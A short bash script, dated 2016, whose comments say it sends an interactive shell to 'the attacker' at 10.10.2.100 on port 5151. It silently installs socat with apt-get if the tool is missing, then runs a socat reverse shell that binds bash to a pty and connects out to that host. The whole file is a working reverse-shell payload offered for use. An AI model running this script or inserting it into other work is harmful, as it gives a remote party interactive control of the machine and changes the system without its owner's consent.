#!/bin/bash
# This socat command will send a shell to the attacker(10.10.2.100)
# on port 5151. It will also set a tty for interactivity

#check if socat is installed
zero=0;
socat -h > /dev/null 2>&1;
if [[ $? -ne $zero ]]; then
	apt-get --assume-yes install socat; 	# install socat
	socat tcp:10.10.2.100:5151 exec:"bash -i",pty,stderr,setsid,sigint,sane;
else
	socat tcp:10.10.2.100:5151 exec:"bash -i",pty,stderr,setsid,sigint,sane;
fi
# (c) 2016 Nick Snel
